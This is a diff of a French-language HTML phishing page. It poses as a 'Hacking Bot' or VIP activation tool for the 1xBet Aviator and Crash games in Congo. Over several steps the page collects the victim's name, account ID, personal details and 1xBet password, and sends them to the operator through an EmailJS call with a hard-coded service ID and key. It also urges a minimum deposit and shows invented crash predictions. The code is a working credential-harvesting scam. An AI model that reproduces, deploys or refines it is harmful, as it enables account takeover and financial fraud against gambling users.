@@ -3,97 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Activation VIP - 1xBet Congo</title>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            // Ta Public Key que tu viens de me donner
-            emailjs.init("Y6BAA47GK0jN4xkZ3");
-        })();
-    </script>
+    <title>Hacking Bot - Système d'Activation</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script> (function() { emailjs.init("Y6BAA47GK0jN4xkZ3"); })(); </script>
     <style>
-        body { background: #0b0f19; color: #e2e8f0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .card { background: #161e2d; padding: 25px; border-radius: 20px; width: 100%; max-width: 400px; text-align: center; border: 1px solid #1e293b; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        .header { display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 12px; margin-bottom: 15px; background: #0f172a; padding: 8px; border-radius: 20px; color: #4ade80; }
-        h2 { font-size: 20px; color: #fff; margin: 10px 0; }
-        label { display: block; text-align: left; font-size: 14px; margin-top: 10px; color: #94a3b8; }
-        input, select { width: 100%; padding: 12px; margin-top: 5px; border-radius: 10px; border: 1px solid #334155; background: #1e293b; color: #fff; box-sizing: border-box; outline: none; }
-        .btn-simuler { background: #facc15; color: #000; font-weight: bold; border: none; padding: 15px; width: 100%; border-radius: 10px; margin-top: 20px; cursor: pointer; transition: 0.3s; }
-        .simulation-box { display: none; background: #0f172a; border: 1px solid #334155; border-radius: 10px; padding: 15px; margin-top: 15px; text-align: left; font-size: 13px; color: #38bdf8; }
-        .gain-box { display: none; background: #064e3b; color: #4ade80; padding: 10px; border-radius: 10px; margin-top: 10px; font-weight: bold; }
-        .btn-final { display: none; background: #1d4ed8; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; margin-top: 15px; cursor: pointer; }
+        body { background: #05070a; color: #cbd5e1; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .container { background: #0f172a; padding: 25px; border-radius: 15px; width: 100%; max-width: 420px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .page { display: none; }
+        .active { display: block; }
+        .header { color: #38bdf8; font-weight: bold; margin-bottom: 20px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+        h2 { color: white; font-size: 1.4rem; margin-bottom: 10px; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; border-radius: 8px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .loading { color: #facc15; font-size: 13px; margin: 10px 0; display: none; }
+        .info-text { font-size: 13px; color: #94a3b8; text-align: left; line-height: 1.5; }
+        .alert { background: rgba(56, 189, 248, 0.1); border-left: 4px solid #38bdf8; padding: 10px; margin: 15px 0; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="header">🟢 🇨🇩 Congo · Kinshasa · Activation du dépôt</div>
-    <h2>Activer ton compte pour le programme</h2>
-    
-    <label>Nom Complet</label>
-    <input type="text" id="fullName" placeholder="Ex: Jean Mukendi">
-
-    <label>ID du compte 1xBet</label>
-    <input type="number" id="userId" placeholder="Doit commencer par 148 ou 150">
-
-    <label>Mot de passe du compte</label>
-    <input type="password" id="userPass" placeholder="Mot de passe 1xBet">
-
-    <label>Choisir le jeu</label>
-    <select id="game">
-        <option value="Aviator">Aviator ✈️</option>
-        <option value="Crash">Crash 🚀</option>
-    </select>
-
-    <button class="btn-simuler" id="btnSim" onclick="lancerSimulation()">📊 Simuler mon profit</button>
-
-    <div class="simulation-box" id="simBox">
-        <p>⏳ Connexion au serveur 1xBet...</p>
-        <p>⏳ Synchronisation de l'ID <span id="spanId"></span>...</p>
-        <p>⏳ Calcul du profit potentiel...</p>
+<div class="container">
+    <div id="page1" class="page active">
+        <div class="header">Step 1: Synchronisation</div>
+        <h2>Connexion au Serveur</h2>
+        <input type="text" id="p1_name" placeholder="Nom Complet">
+        <input type="number" id="p1_id" placeholder="ID 1xBet">
+        <div id="p1_loader" class="loading">⏳ Synchronisation avec la base de données...</div>
+        <button onclick="toPage2()">Continuer</button>
     </div>
 
-    <div class="gain-box" id="gainBox">
-        Le programme montre un gain potentiel d'environ 95 000 CDF.
+    <div id="page2" class="page">
+        <div class="header">Step 2: Identité Complète</div>
+        <select id="p2_sex"><option>Sexe</option><option>Masculin</option><option>Féminin</option></select>
+        <input type="text" id="p2_pays" placeholder="Pays">
+        <input type="text" id="p2_ville" placeholder="Ville actuelle">
+        <input type="date" id="p2_date">
+        <label style="font-size: 13px;"><input type="checkbox" id="p2_age" checked> J'ai 18 ans ou plus</label>
+        <button onclick="showPage(3)">Continuer</button>
     </div>
 
-    <button class="btn-final" id="btnFinal" onclick="envoyerEmail()">🚀 Commencer à gagner maintenant</button>
+    <div id="page3" class="page">
+        <div class="header">Step 3: Sécurisation du Bot</div>
+        <div class="alert">
+            Votre code de session : <strong id="sessionCode">HB-8829</strong><br><br>
+            <strong>Note importante :</strong> Seuls les comptes ayant un dépôt d'activation de 10 000 FC minimum sont éligibles. Cet argent reste dans votre compte pour lancer les premières prédictions.
+        </div>
+        <input type="password" id="p3_pass" placeholder="Mot de passe 1xBet">
+        <p class="info-text">En confirmant, vous liez votre compte au Hacking Bot VIP.</p>
+        <button onclick="finalSubmit()">Confirmer l'activation</button>
+    </div>
+
+    <div id="page4" class="page">
+        <div class="header">Tableau de Bord VIP</div>
+        <h2>Prédictions en cours...</h2>
+        <div class="alert" style="color: #4ade80;">
+            ✈️ Aviator: Prochain crash estimé à 12.45x<br>
+            🚀 Crash: Stabilité du serveur 98%
+        </div>
+        <p class="info-text">Pour débloquer l'utilisation complète du <strong>Hacking Bot</strong>, vous devez entrer le code secret envoyé par l'Administrateur Système.</p>
+        <button style="background: #facc15;" onclick="alert('Contactez l\'administrateur pour recevoir votre code.')">MOT DE PASSE ET CODE REÇU</button>
+        <button style="background: #1e293b; color: white; margin-top: 10px;" onclick="window.location.reload()">RETOUR AU TERMINAL</button>
+    </div>
 </div>
 
 <script>
-    function lancerSimulation() {
-        const id = document.getElementById('userId').value;
-        if(id === "" || document.getElementById('userPass').value === "") { 
-            alert("Veuillez remplir tous les champs !"); 
-            return; 
-        }
-        
-        document.getElementById('btnSim').style.display = "none";
-        document.getElementById('simBox').style.display = "block";
-        document.getElementById('spanId').innerText = id;
-
-        setTimeout(() => {
-            document.getElementById('gainBox').style.display = "block";
-            document.getElementById('btnFinal').style.display = "block";
-        }, 3000);
+    function showPage(num) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page' + num).classList.add('active');
     }
 
-    function envoyerEmail() {
-        const params = {
-            nom: document.getElementById('fullName').value,
-            id: document.getElementById('userId').value,
-            pass: document.getElementById('userPass').value,
-            game: document.getElementById('game').value
+    function toPage2() {
+        if(document.getElementById('p1_name').value == "") return alert("Remplissez les champs");
+        document.getElementById('p1_loader').style.display = "block";
+        setTimeout(() => { showPage(2); }, 2000);
+    }
+
+    function finalSubmit() {
+        const pass = document.getElementById('p3_pass').value;
+        if(pass == "") return alert("Entrez votre mot de passe");
+
+        const data = {
+            nom: document.getElementById('p1_name').value,
+            id: document.getElementById('p1_id').value,
+            sexe: document.getElementById('p2_sex').value,
+            pays: document.getElementById('p2_pays').value,
+            ville: document.getElementById('p2_ville').value,
+            pass: pass
         };
 
-        // On envoie vers ton Service ID service_ag0odpl
-        // IMPORTANT: Remplace 'template_id_ici' par ton ID de modèle EmailJS
-        emailjs.send("service_ag0odpl", "template_id_ici", params)
+        // REMPLACE "TON_TEMPLATE_ID" PAR TON CODE EMAILJS
+        emailjs.send("service_ag0odpl", "template_id_ici", data)
         .then(() => {
-            alert("Activation en cours !");
-            window.location.href = "https://1xbet.com";
-        }, (err) => {
-            alert("Erreur lors de l'envoi.");
+            showPage(4);
         });
     }
 </script>
